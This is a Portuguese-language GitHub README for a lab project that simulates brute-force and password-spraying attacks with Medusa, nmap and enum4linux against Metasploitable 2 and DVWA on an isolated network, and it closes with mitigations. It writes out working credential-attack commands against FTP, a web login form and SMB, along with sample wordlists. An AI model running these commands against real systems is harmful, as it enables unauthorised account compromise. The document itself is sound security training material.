# Ataques-de-For-a-Bruta
Simulação em Kali Linux + Metasploitable 2 + DVWA

Este projeto demonstra a criação de um ambiente de laboratório para explorar e entender ataques de força bruta, password spraying e a automação de tentativas de login, utilizando ferramentas como Medusa no Kali Linux. Foi criado um ambiente simulado com o propósito de aprendizado e experimentação.

Atenção: Todos os experimentos descritos neste projeto foram realizados em um ambiente controlado, com o objetivo de aprender sobre segurança da informação. Não realize esses testes em ambientes de produção ou sem a devida autorização.

 Objetivos:

Compreender como funcionam os ataques de força bruta em diferentes protocolos (FTP, Web e SMB).
Aprender a utilizar a ferramenta Medusa no Kali Linux para simular ataques.
Criar wordlists personalizadas para otimizar os testes.
Documentar o processo de forma clara e organizada.
Compartilhar o projeto como portfólio técnico no GitHub.
1. Preparando o Terreno: Configuração do Ambiente

Para simular os ataques, utilizamos um ambiente isolado com as seguintes máquinas virtuais:

Máquina	Sistema	Função
Kali Linux	Kali 2024	Atacante (onde executamos o Medusa)
Metasploitable 2	Ubuntu Vulnerável	Alvo (FTP, Telnet, SMB, Web)
DVWA	Aplicação PHP	Alvo (Testes de segurança web)
Configuração de Rede:

Rede: Host-Only (as máquinas comunicam-se entre si, mas não têm acesso direto à internet).
Validação da Conectividade: Utilizamos o comando ping para verificar se as máquinas estavam se comunicando corretamente:

--[ping 192.168.56.102]--
O endereço IP (192.168.56.102) é um exemplo e pode variar dependendo da sua configuração de rede.

2. Criando Nossas Armas: Wordlists Personalizadas

Para simular os ataques, criamos duas wordlists simples:

wordlist-usuarios.txt: Contém nomes de usuário comuns.
{ admin
user
msfadmin
test
}    :wordlist-senhas.txt: Contém senhas comuns.

{123456
password
msfadmin
admin}
Em um cenário real, wordlists muito maiores e mais complexas são utilizadas.

Espionando o Alvo: Enumeração de Serviços (Nmap)

Antes de iniciar os ataques, utilizamos o Nmap para identificar quais serviços estavam rodando no Metasploitable 2.


Copy code
{nmap -sV 192.168.56.102}

O Nmap revelou diversos serviços vulneráveis, incluindo:

FTP (porta 21)
SSH (porta 22)
Telnet (porta 23)
SMB (portas 139/445)
HTTP (porta 80)
4. A Batalha Começa: Testes Práticos com Medusa

Agora que conhecemos nossos alvos, vamos aos ataques!

 4.1 Ataque de Força Bruta no FTP
---------------------------------------------------------------------------------------------------------------------------
Comando utilizado:


Copy code
{medusa -h 192.168.56.102 -u msfadmin -P wordlist-senhas.txt -M ftp}

-h: Endereço IP do alvo (Metasploitable 2).
-u: Nome de usuário para testar (neste caso msfadmin).
-P: Path da wordlist de senhas (wordlist-senhas.txt).
-M: Módulo do Medusa para o protocolo FTP.
Resultado esperado:

Copy code
{Credenciais válidas identificadas: msfadmin : msfadmin}

Validação:

Após o ataque bem-sucedido, validamos as credenciais conectando-nos ao FTP:


Copy code
{ftp 192.168.56.102}

4.2 Força Bruta em Formulário Web (DVWA)

Importante: Antes de começar, configure o nível de segurança do DVWA para "Low" para facilitar o teste.

Comando utilizado com o módulo web-form:


Copy code
{medusa -h 192.168.56.102 \
  -u admin \
  -P wordlist-senhas.txt \
  -M web-form \
  -m FORM:"/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login"
  }
  
-m FORM: Define o formulário de login a ser atacado. A string especifica qual o caminho do formulário, os parâmetros de usuário e senha, e o nome do botão de Login.
^USER^: Marcador que o Medusa substitui pelo nome de usuário da wordlist.
^PASS^: Marcador que o Medusa substitui pela senha da wordlist.

4.3 Enumeração + Password Spraying em SMB

O password spraying consiste em tentar uma única senha para vários usuários.

Passo 1 – Enumeração de Usuários:

Utilizamos a ferramenta enum4linux para listar os usuários do sistema SMB:


Copy code
{enum4linux -U 192.168.56.102}

Exemplo de usuários identificados:

Copy code
{msfadmin
user
service}

Passo 2 – Password Spraying com Medusa:


Copy code
{medusa -h 192.168.56.102 \
  -U wordlist-usuarios.txt \
  -p msfadmin \
  -M smbnt}
  
-U: Path da wordlist de usuários (wordlist-usuarios.txt).
-p: Senha a ser testada (msfadmin).
-M: Módulo do Medusa para o protocolo SMB.

 5. Defendendo o Castelo: Medidas de Mitigação

Após simular os ataques, é crucial pensar em como proteger nossos sistemas. Algumas medidas de mitigação incluem:

Para serviços FTP e SMB:

Desabilitar protocolos inseguros (como Telnet e FTP sem criptografia).
Implementar SFTP/SSH (que utilizam criptografia para proteger a comunicação).
Limitar o número de tentativas de login (para dificultar ataques de força bruta).
Para aplicações Web:

Implementar CAPTCHA (para diferenciar humanos de bots).
Utilizar autenticação de múltiplos fatores (MFA) (para adicionar uma camada extra de segurança).
Implementar bloqueios de conta após um certo número de tentativas de login falhas.
Boas Práticas Gerais:

Utilizar senhas fortes e únicas para cada conta.
Monitorar constantemente os sistemas em busca de atividades suspeitas.
Manter os sistemas e aplicações atualizados com as últimas correções de segurança.
Este projeto demonstrou, em um ambiente controlado, como ataques de força bruta podem ser realizados e quais medidas podem ser tomadas para se proteger contra eles. Lembre-se sempre de utilizar essas informações de forma ética e responsável, com o objetivo de melhorar a segurança dos seus sistemas.





